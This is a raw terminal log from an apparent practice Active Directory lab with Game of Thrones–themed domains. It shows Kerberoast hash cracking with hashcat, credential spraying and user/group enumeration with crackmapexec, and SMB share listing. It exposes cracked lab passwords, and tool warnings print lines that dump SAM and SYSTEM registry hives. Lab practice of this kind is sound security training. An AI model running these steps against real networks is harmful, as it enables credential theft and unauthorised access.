└─$ hashcat \-m 13100 \-a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting

cuInit(): no CUDA-capable device is detected

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL\_DEBUG) \- Platform \#1 \[The pocl project\]  
\====================================================================================================================================================  
\* Device \#1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2201/4466 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 3 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1

Optimizers applied:  
\* Zero-Byte  
\* Not-Iterated

ATTENTION\! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append \-O to your commandline.  
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:  
\* Filename..: /usr/share/wordlists/rockyou.txt  
\* Passwords.: 14344385  
\* Bytes.....: 139921507  
\* Keyspace..: 14344385

Cracking performance lower than expected?                 

\* Append \-O to the commandline.  
  This lowers the maximum supported password/salt length (usually down to 32).

\* Append \-w 3 to the commandline.  
  This can cause your screen to lag.

\* Append \-S to the commandline.  
  This has a drastic speed impact but can be better for specific attacks.  
  Typical scenarios are a small wordlist but a large ruleset.

\* Update your backend API runtime / driver the right way:  
  https://hashcat.net/faq/wrongdriver

\* Create more work items to make use of your parallelization power:  
  https://hashcat.net/faq/morework

$krb5tgs$23$\*jon.snow$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/jon.snow\*$9b28f8277ca435e082150d1a007eee15$6cdc846db2c447f440476aff78f68c999657f00bcbc70136c5118221f506bcef89ba43130a9cc757368c03b889f42873350046d27f9a13a282def9388a7cdb5a20b1193789548b28aa5ef546fe67480c0a35b8ff64bcf82b7b1f51ba32ad6f0d55c7657137d8b70bd7ccd2ce1a6678fcdf85794b466883773435709d1f75a68919e79bbdbeb49f87fd144a9edf729ee8305a253273f5a0a51de09cc97fc26140334c358267b863c07d7aa8b1a9a6f3d914642ee0c0991529abedc6ee65459eee3124edfd6ad9e11d3d050d9b7f4888e0dc2bb56560974f17a227b65cd14ee30e444c05fcb18a485adc28bb4b6fa667767ed5dc35a8c1cd68a01ca73fd681d7639c10c6449ef5cc06c642f4ca2bd2fd7bd4e7de6db15329307db6bfb44c81a548c142f46adf80a74c9186342ebfd1cb221326c92157d43e41941a3605e428eb822faf9fafaaf8d90bb26af1b751e3fe0a328d3c8078098268d03a95e0b970f344ee55e6b495a82584c023abe71212210dd0dce3e1afbfc6bb155ef4daf398858e9dab25776a6b28c250b716ea416c3ca2600d893e1c418c0af702b6efc03fc612ef4c734a7224ab84172ff34529671c92a28d5af16deed84ce0b3025f122d22dafb5f21646caa63ce2e28de78a1cabec8deaf52708ab95e9dcdc27de0acea001d5c29dddea21bcd49d1b370b639254dee965b26438203202c0b58720c7e6cfc7b0755af16927e3acba0b7e764eea780933e819763f363bfdb61dfd9082bc191f7b22c63995a59899fbeda3cb118acc4968bb8cb12295833b1ea9975a8df1b142f18ed99d64ea9f2488d5ea5ccbe2c4cc2b1554545e9ca89af980c419af130bc878e35259dfc048ba2ac6828dd1a83a86a59481c23d39a271fbd572ca381a31745c4fe6a6e711a9a01adc5ac8cb1a5ad4112f5eae01835685b32becc70b6f0786475913c73e18f70846619516ccde74e6b39f50e1b67029fa7ed7a28cf63c75eaa228d6a9c3b52f2ab3f8df837146e0d69d00ab65d8af366719f0735cf95731ac51914c76c8f36961abc58bb3b765000d7801c0e8f3b6d76443c7faab5fa40e3dc8d729c559378ba5fba57e694f59d82b56ecb63a8bc70e83b0958c77160e70552d3d8b5582808a87684e6baa709771d2863bad72560a305a37f21b6cc4ee645ae7b086f49850229f8ba61f5db66734bc751a75fa0ea02db03cba230d945135bc75bef917b01413bae5fdb05d2aedb0ea228bcc3efa80b258e0f8e6950e2123d3008807644f6f5be5ad27a2d698d3bfa65e023e2e48ff96c3b117411de41aa0289bbdf82b5f1af6d948573c0eb93157924e3f614a17f98a71ccbddbadef9b0ab8f92784c96bede11b6523f19cbc22ea56c2cd06d9e192613:iknownothing  
Approaching final keyspace \- workload adjusted.           

                                                            
Session..........: hashcat  
Status...........: Exhausted  
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)  
Hash.Target......: kerberoast.txt  
Time.Started.....: Tue Aug 26 14:14:33 2025 (25 secs)  
Time.Estimated...: Tue Aug 26 14:14:58 2025 (0 secs)  
Kernel.Feature...: Pure Kernel  
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.\#1.........:  1436.2 kH/s (1.47ms) @ Accel:512 Loops:1 Thr:1 Vec:16  
Recovered........: 1/3 (33.33%) Digests (total), 1/3 (33.33%) Digests (new), 1/3 (33.33%) Salts  
Progress.........: 43033155/43033155 (100.00%)  
Rejected.........: 0/43033155 (0.00%)  
Restore.Point....: 14344385/14344385 (100.00%)  
Restore.Sub.\#1...: Salt:2 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.\#1....: $HEX\[212173657879616e67656c2121\] \-\> $HEX\[042a0337c2a156616d6f732103\]  
Hardware.Mon.\#1..: Util: 66%

Started: Tue Aug 26 14:14:16 2025  
Stopped: Tue Aug 26 14:14:59 2025  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.0/24 \-u jon.snow \-p iknownothing  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ ldapsearch \-x \-H ldap://ZIELHOST \-D "jon.snow@north.sevenkingdoms.local" \-w iknownothing \-b "dc=north,dc=sevenkingdoms,dc=local"

ldap\_sasl\_bind(SIMPLE): Can't contact LDAP server (-1)  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.0/24 \-u jon.snow \-p iknownothing

/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.10   445    KINGSLANDING     \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)  
SMB         192.168.20.23   445    BRAAVOS          \[\*\] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)  
SMB         192.168.20.12   445    MEEREEN          \[\*\] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)  
SMB         192.168.20.22   445    CASTELBLACK      \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)  
SMB         192.168.20.11   445    WINTERFELL       \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)  
SMB         192.168.20.10   445    KINGSLANDING     \[-\] sevenkingdoms.local\\jon.snow:iknownothing STATUS\_LOGON\_FAILURE   
SMB         192.168.20.23   445    BRAAVOS          \[+\] essos.local\\jon.snow:iknownothing   
SMB         192.168.20.12   445    MEEREEN          \[-\] essos.local\\jon.snow:iknownothing STATUS\_LOGON\_FAILURE   
SMB         192.168.20.11   445    WINTERFELL       \[+\] north.sevenkingdoms.local\\jon.snow:iknownothing   
SMB         192.168.20.22   445    CASTELBLACK      \[+\] north.sevenkingdoms.local\\jon.snow:iknownothing   
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.0/24 \-u jon.snow \-p iknownothing  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.22   445    CASTELBLACK      \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)  
SMB         192.168.20.11   445    WINTERFELL       \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)  
SMB         192.168.20.12   445    MEEREEN          \[\*\] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)  
SMB         192.168.20.23   445    BRAAVOS          \[\*\] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)  
SMB         192.168.20.10   445    KINGSLANDING     \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)  
SMB         192.168.20.22   445    CASTELBLACK      \[+\] north.sevenkingdoms.local\\jon.snow:iknownothing   
SMB         192.168.20.12   445    MEEREEN          \[-\] essos.local\\jon.snow:iknownothing STATUS\_LOGON\_FAILURE   
SMB         192.168.20.23   445    BRAAVOS          \[+\] essos.local\\jon.snow:iknownothing   
SMB         192.168.20.10   445    KINGSLANDING     \[-\] sevenkingdoms.local\\jon.snow:iknownothing STATUS\_LOGON\_FAILURE   
SMB         192.168.20.11   445    WINTERFELL       \[+\] north.sevenkingdoms.local\\jon.snow:iknownothing   
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient \-L //192.168.20.11/ \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:

        Sharename       Type      Comment  
        \---------       \----      \-------  
        ADMIN$          Disk      Remote Admin  
        C$              Disk      Default share  
        IPC$            IPC       Remote IPC  
        NETLOGON        Disk      Logon server share   
        SYSVOL          Disk      Logon server share   
Reconnecting with SMB1 for workgroup listing.  
do\_connect: Connection to 192.168.20.11 failed (Error NT\_STATUS\_RESOURCE\_NAME\_NOT\_FOUND)  
Unable to connect with SMB1 \-- no workgroup available  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient \-L //192.168.20.22/ \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:

        Sharename       Type      Comment  
        \---------       \----      \-------  
        ADMIN$          Disk      Remote Admin  
        all             Disk      Basic RW share for all  
        C$              Disk      Default share  
        IPC$            IPC       Remote IPC  
        public          Disk      Basic Read share for all domain users  
Reconnecting with SMB1 for workgroup listing.  
do\_connect: Connection to 192.168.20.22 failed (Error NT\_STATUS\_RESOURCE\_NAME\_NOT\_FOUND)  
Unable to connect with SMB1 \-- no workgroup available  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient \-L //192.168.20.23/ \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:

        Sharename       Type      Comment  
        \---------       \----      \-------  
        ADMIN$          Disk      Remote Admin  
        all             Disk      Basic RW share for all  
        C$              Disk      Default share  
        CertEnroll      Disk      Active Directory Certificate Services share  
        IPC$            IPC       Remote IPC  
        public          Disk      Basic Read share for all domain users  
Reconnecting with SMB1 for workgroup listing.  
do\_connect: Connection to 192.168.20.23 failed (Error NT\_STATUS\_RESOURCE\_NAME\_NOT\_FOUND)  
Unable to connect with SMB1 \-- no workgroup available  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient //192.168.20.11/C$ \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:  
tree connect failed: NT\_STATUS\_ACCESS\_DENIED  
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.11 \-u jon.snow \-p iknownothing \--users  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.11   445    WINTERFELL       \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)  
SMB         192.168.20.11   445    WINTERFELL       \[+\] north.sevenkingdoms.local\\jon.snow:iknownothing   
SMB         192.168.20.11   445    WINTERFELL       \[+\] Enumerated domain user(s)  
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\sql\_svc                        badpwdcount: 4 desc: sql service                                                                                                                                       
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\jeor.mormont                   badpwdcount: 4 desc: Jeor Mormont                                                                                                                                      
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\samwell.tarly                  badpwdcount: 4 desc: Samwell Tarly (Password : Heartsbane)                                                                                                             
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\jon.snow                       badpwdcount: 4 desc: Jon Snow                                                                                                                                          
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\hodor                          badpwdcount: 0 desc: Brainless Giant                                                                                                                                   
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\rickon.stark                   badpwdcount: 4 desc: Rickon Stark                                                                                                                                      
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\brandon.stark                  badpwdcount: 0 desc: Brandon Stark                                                                                                                                     
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\sansa.stark                    badpwdcount: 4 desc: Sansa Stark                                                                                                                                       
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\robb.stark                     badpwdcount: 0 desc: Robb Stark                                                                                                                                        
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\catelyn.stark                  badpwdcount: 4 desc: Catelyn Stark                                                                                                                                     
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\eddard.stark                   badpwdcount: 0 desc: Eddard Stark                                                                                                                                      
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\arya.stark                     badpwdcount: 0 desc: Arya Stark                                                                                                                                        
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\krbtgt                         badpwdcount: 4 desc: Key Distribution Center Service Account                                                                                                           
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\cloudbase-init                 badpwdcount: 4 desc:   
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\vagrant                        badpwdcount: 4 desc: Vagrant User                                                                                                                                      
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\Guest                          badpwdcount: 2 desc: Built-in account for guest access to the computer/domain                                                                                          
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\Administrator                  badpwdcount: 2 desc: Built-in account for administering the computer/domain                                                                                            
                                                                                                                                           
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.11 \-u jon.snow \-p iknownothing \--users  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.11   445    WINTERFELL       \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)  
SMB         192.168.20.11   445    WINTERFELL       \[+\] north.sevenkingdoms.local\\jon.snow:iknownothing   
SMB         192.168.20.11   445    WINTERFELL       \[+\] Enumerated domain user(s)  
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\sql\_svc                        badpwdcount: 4 desc: sql service  
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\jeor.mormont                   badpwdcount: 4 desc: Jeor Mormont  
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\samwell.tarly                  badpwdcount: 4 desc: Samwell Tarly (Password : Heartsbane)                                                                                                                                 
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\jon.snow                       badpwdcount: 4 desc: Jon Snow  
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\hodor                          badpwdcount: 0 desc: Brainless Giant  
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\rickon.stark                   badpwdcount: 4 desc: Rickon Stark  
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\brandon.stark                  badpwdcount: 0 desc: Brandon Stark  
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\sansa.stark                    badpwdcount: 4 desc: Sansa Stark  
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\robb.stark                     badpwdcount: 0 desc: Robb Stark  
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\catelyn.stark                  badpwdcount: 4 desc: Catelyn Stark  
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\eddard.stark                   badpwdcount: 0 desc: Eddard Stark  
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\arya.stark                     badpwdcount: 0 desc: Arya Stark  
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\krbtgt                         badpwdcount: 4 desc: Key Distribution Center Service Account                                                                                                                               
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\cloudbase-init                 badpwdcount: 4 desc:   
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\vagrant                        badpwdcount: 4 desc: Vagrant User  
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\Guest                          badpwdcount: 2 desc: Built-in account for guest access to the computer/domain                                                                                                              
SMB         192.168.20.11   445    WINTERFELL       north.sevenkingdoms.local\\Administrator                  badpwdcount: 2 desc: Built-in account for administering the computer/domain                                                                                                                
                                                                                                                                                     
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.11 \-u jon.snow \-p iknownothing \--groups  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.11   445    WINTERFELL       \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)  
SMB         192.168.20.11   445    WINTERFELL       \[+\] north.sevenkingdoms.local\\jon.snow:iknownothing   
SMB         192.168.20.11   445    WINTERFELL       \[+\] Enumerated domain group(s)  
SMB         192.168.20.11   445    WINTERFELL       AcrossTheSea                             membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Mormont                                  membercount: 1  
SMB         192.168.20.11   445    WINTERFELL       Night Watch                              membercount: 3  
SMB         192.168.20.11   445    WINTERFELL       Stark                                    membercount: 9  
SMB         192.168.20.11   445    WINTERFELL       DnsUpdateProxy                           membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       DnsAdmins                                membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Key Admins                               membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Protected Users                          membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Cloneable Domain Controllers             membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Read-only Domain Controllers             membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Denied RODC Password Replication Group   membercount: 8  
SMB         192.168.20.11   445    WINTERFELL       Allowed RODC Password Replication Group  membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Terminal Server License Servers          membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Windows Authorization Access Group       membercount: 1  
SMB         192.168.20.11   445    WINTERFELL       Pre-Windows 2000 Compatible Access       membercount: 1  
SMB         192.168.20.11   445    WINTERFELL       Account Operators                        membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Server Operators                         membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       RAS and IAS Servers                      membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Group Policy Creator Owners              membercount: 1  
SMB         192.168.20.11   445    WINTERFELL       Domain Guests                            membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Domain Users                             membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Domain Admins                            membercount: 2  
SMB         192.168.20.11   445    WINTERFELL       Cert Publishers                          membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Domain Controllers                       membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Domain Computers                         membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Storage Replica Administrators           membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Remote Management Users                  membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Access Control Assistance Operators      membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Hyper-V Administrators                   membercount: 0  
